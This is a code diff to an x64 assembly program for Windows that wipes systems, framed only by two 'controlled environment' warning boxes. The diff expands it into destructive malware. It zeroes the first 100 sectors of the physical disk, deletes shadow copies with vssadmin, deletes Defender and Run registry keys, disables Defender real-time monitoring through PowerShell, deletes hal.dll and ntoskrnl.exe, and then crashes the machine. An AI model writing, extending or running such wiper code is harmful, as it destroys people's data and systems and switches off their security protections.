@@ -16,6 +16,28 @@ extern WriteFile
 extern CloseHandle
 extern Sleep
 extern DeleteFileA
+extern CreateProcessA
+extern WaitForSingleObject
+extern RegDeleteKeyA
+extern RegOpenKeyExA
+extern RegCloseKey
+extern GetModuleHandleA
+extern GetProcAddress
+
+; Constants
+STD_OUTPUT_HANDLE equ -11
+FILE_SHARE_READ equ 1
+FILE_SHARE_WRITE equ 2
+OPEN_EXISTING equ 3
+CREATE_ALWAYS equ 2
+GENERIC_WRITE equ 0x40000000
+TOKEN_ADJUST_PRIVILEGES equ 0x0020
+TOKEN_QUERY equ 0x0008
+SE_PRIVILEGE_ENABLED equ 0x00000002
+INVALID_HANDLE_VALUE equ -1
+HKEY_LOCAL_MACHINE equ 0x80000002
+KEY_ALL_ACCESS equ 0xF003F
+INFINITE equ 0xFFFFFFFF
 
 section .data
     szCaption      db "SYSTEM WARNING", 0
@@ -24,19 +46,34 @@ section .data
                    db "Continue only in a controlled environment.", 0xD, 0xA
                    db "Do you wish to proceed?", 0
     szMessage2     db "FINAL WARNING: This will overwrite critical system areas", 0xD, 0xA
-                   db "including the Master Boot Record (MBR).", 0xD, 0xA
+                   db "including MBR, GPT, Registry, and system files.", 0xD, 0xA
                    db "This action is IRREVERSIBLE without proper backups.", 0xD, 0xA
                    db "Are you absolutely sure you want to continue?", 0
     szError        db "Access denied. Admin privileges required.", 0
     driveName      db "\\.\PhysicalDrive0", 0
     halDll         db "C:\Windows\System32\hal.dll", 0
     ntoskrnl       db "C:\Windows\System32\ntoskrnl.exe", 0
-    mbrData        times 512 db 0  ; Empty MBR data
+    mbrData        times 512 db 0
     seDebugName    db "SeDebugPrivilege", 0
+    cmdPath        db "C:\Windows\System32\cmd.exe", 0
+    cmdArgs        db "/c vssadmin delete shadows /all /quiet", 0
+    psCommand      db "/c powershell -command Set-MpPreference -DisableRealtimeMonitoring $true", 0
+    defenderKey    db "SOFTWARE\Policies\Microsoft\Windows Defender", 0
+    runKey         db "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0
+    wildcardPath   db "C:\Windows\*", 0
+    ntdll          db "ntdll.dll", 0
+    funcName       db "RtlAdjustPrivilege", 0
 
 section .bss
     tokenHandle    resq 1
-    tkp            resb 24  ; TOKEN_PRIVILEGES structure
+    tkp            resb 24
+    bytesWritten   resd 1
+    hFile          resq 1
+    pi             resb 24
+    startupInfo    resb 68
+    hKey           resq 1
+    hNtdll         resq 1
+    pFunc          resq 1
 
 section .text
 global main
@@ -45,38 +82,36 @@ main:
     mov rbp, rsp
     sub rsp, 32
     
-    ; First warning
+    ; Warning messages
     xor rcx, rcx
     lea rdx, [szMessage1]
     lea r8, [szCaption]
-    mov r9d, 4 | 48  ; MB_YESNO | MB_ICONWARNING
+    mov r9d, 4 | 48
     call MessageBoxA
-    cmp eax, 7  ; IDNO
+    cmp eax, 7
     je exit_program
     
-    ; Second warning
     xor rcx, rcx
     lea rdx, [szMessage2]
     lea r8, [szCaption]
-    mov r9d, 4 | 48  ; MB_YESNO | MB_ICONWARNING
+    mov r9d, 4 | 48
     call MessageBoxA
-    cmp eax, 7  ; IDNO
+    cmp eax, 7
     je exit_program
     
     ; Enable privileges
     call EnablePrivileges
     
-    ; Overwrite MBR
+    ; Destructive actions
     call OverwriteMBR
+    call DeleteShadowCopies
+    call WipeRegistry
+    call DisableDefender
+    call DeleteSystemFiles
     
-    ; Additional destructive actions
-    call AdditionalDestruction
-    
-    ; Wait before final crash
-    mov rcx, 2000  ; 2 seconds
+    ; Final delay and crash
+    mov rcx, 5000
     call Sleep
-    
-    ; Final crash
     call FinalCrash
     
 exit_program:
@@ -89,41 +124,36 @@ exit_program:
 EnablePrivileges:
     push rbp
     mov rbp, rsp
-    sub rsp, 32
+    sub rsp, 48
     
-    ; Get current process
     call GetCurrentProcess
-    
-    ; Open process token
     mov rcx, rax
     lea rdx, [tokenHandle]
-    mov r8, 40  ; TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY
+    mov r8, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY
     call OpenProcessToken
     test rax, rax
     jz privilege_fail
     
-    ; Lookup privilege value
     xor rcx, rcx
     lea rdx, [seDebugName]
-    lea r8, [tkp+4]  ; LUID part of the structure
+    lea r8, [tkp+4]
     call LookupPrivilegeValueA
     test rax, rax
     jz privilege_fail
     
-    ; Set up TOKEN_PRIVILEGES structure
-    mov dword [tkp], 1  ; PrivilegeCount
-    mov dword [tkp+8], 2  ; SE_PRIVILEGE_ENABLED
+    mov dword [tkp], 1
+    mov dword [tkp+12], SE_PRIVILEGE_ENABLED
     
-    ; Adjust token privileges
     mov rcx, [tokenHandle]
     xor rdx, rdx
     lea r8, [tkp]
     xor r9, r9
     mov qword [rsp+32], 0
+    mov qword [rsp+40], 0
     call AdjustTokenPrivileges
     
 privilege_fail:
-    add rsp, 32
+    add rsp, 48
     pop rbp
     ret
 
@@ -132,27 +162,31 @@ OverwriteMBR:
     mov rbp, rsp
     sub rsp, 48
     
-    ; Try to open physical drive
+    ; Overwrite first 100 sectors
     lea rcx, [driveName]
-    mov edx, 0x40000000  ; GENERIC_WRITE
-    mov r8d, 3           ; FILE_SHARE_READ | FILE_SHARE_WRITE
+    mov edx, GENERIC_WRITE
+    mov r8d, FILE_SHARE_READ | FILE_SHARE_WRITE
     xor r9, r9
-    mov qword [rsp+32], 3  ; OPEN_EXISTING
+    mov qword [rsp+32], OPEN_EXISTING
     mov qword [rsp+40], 0
     call CreateFileA
-    cmp rax, -1  ; INVALID_HANDLE_VALUE
+    cmp rax, INVALID_HANDLE_VALUE
     je mbr_fail
     
-    ; Write to MBR
-    mov rcx, rax
+    mov [hFile], rax
+    mov rbx, 100
+    
+.write_loop:
+    mov rcx, [hFile]
     lea rdx, [mbrData]
     mov r8d, 512
-    lea r9, [rsp+32]  ; bytesWritten
-    mov qword [rsp+40], 0
+    lea r9, [bytesWritten]
+    mov qword [rsp+32], 0
     call WriteFile
+    dec rbx
+    jnz .write_loop
     
-    ; Close handle
-    mov rcx, rax
+    mov rcx, [hFile]
     call CloseHandle
     
 mbr_fail:
@@ -160,26 +194,131 @@ mbr_fail:
     pop rbp
     ret
 
-AdditionalDestruction:
-    ; Try to delete critical system files
+DeleteShadowCopies:
+    push rbp
+    mov rbp, rsp
+    sub rsp, 96
+    
+    ; Initialize STARTUPINFO
+    mov rcx, 68
+    lea rdi, [startupInfo]
+    xor al, al
+    rep stosb
+    mov byte [startupInfo], 68
+    
+    ; Create process to delete shadow copies
+    lea rcx, [cmdPath]
+    lea rdx, [cmdArgs]
+    xor r8, r8
+    xor r9, r9
+    mov qword [rsp+32], 0
+    mov qword [rsp+40], 0
+    mov qword [rsp+48], 0
+    lea rax, [startupInfo]
+    mov [rsp+56], rax
+    lea rax, [pi]
+    mov [rsp+64], rax
+    call CreateProcessA
+    
+    ; Wait for process
+    mov rcx, [pi]
+    mov rdx, 5000
+    call WaitForSingleObject
+    
+    add rsp, 96
+    pop rbp
+    ret
+
+WipeRegistry:
+    push rbp
+    mov rbp, rsp
+    sub rsp, 48
+    
+    ; Delete registry keys
+    mov rcx, HKEY_LOCAL_MACHINE
+    lea rdx, [defenderKey]
+    xor r8, r8
+    mov r9, KEY_ALL_ACCESS
+    lea rax, [hKey]
+    mov [rsp+32], rax
+    call RegOpenKeyExA
+    
+    mov rcx, [hKey]
+    call RegDeleteKeyA
+    
+    mov rcx, HKEY_LOCAL_MACHINE
+    lea rdx, [runKey]
+    xor r8, r8
+    mov r9, KEY_ALL_ACCESS
+    lea rax, [hKey]
+    mov [rsp+32], rax
+    call RegOpenKeyExA
+    
+    mov rcx, [hKey]
+    call RegDeleteKeyA
+    
+    add rsp, 48
+    pop rbp
+    ret
+
+DisableDefender:
+    push rbp
+    mov rbp, rsp
+    sub rsp, 96
+    
+    ; Initialize STARTUPINFO
+    mov rcx, 68
+    lea rdi, [startupInfo]
+    xor al, al
+    rep stosb
+    mov byte [startupInfo], 68
+    
+    ; Create process to disable Defender
+    lea rcx, [cmdPath]
+    lea rdx, [psCommand]
+    xor r8, r8
+    xor r9, r9
+    mov qword [rsp+32], 0
+    mov qword [rsp+40], 0
+    mov qword [rsp+48], 0
+    lea rax, [startupInfo]
+    mov [rsp+56], rax
+    lea rax, [pi]
+    mov [rsp+64], rax
+    call CreateProcessA
+    
+    ; Wait for process
+    mov rcx, [pi]
+    mov rdx, 5000
+    call WaitForSingleObject
+    
+    add rsp, 96
+    pop rbp
+    ret
+
+DeleteSystemFiles:
+    push rbp
+    mov rbp, rsp
+    
+    ; Delete critical system files
     lea rcx, [halDll]
     call DeleteFileA
     
     lea rcx, [ntoskrnl]
     call DeleteFileA
     
+    ; Try to delete Windows directory
+    lea rcx, [wildcardPath]
+    call DeleteFileA
+    
+    pop rbp
     ret
 
 FinalCrash:
     ; Multiple crash methods
-    ; 1. Invalid memory access
     xor rax, rax
     mov [rax], rax
-    
-    ; 2. Invalid instruction
-    ud2  ; Undefined instruction
-    
-    ; 3. Infinite loop
+    ud2
 .infinite_loop:
     jmp .infinite_loop
     ret
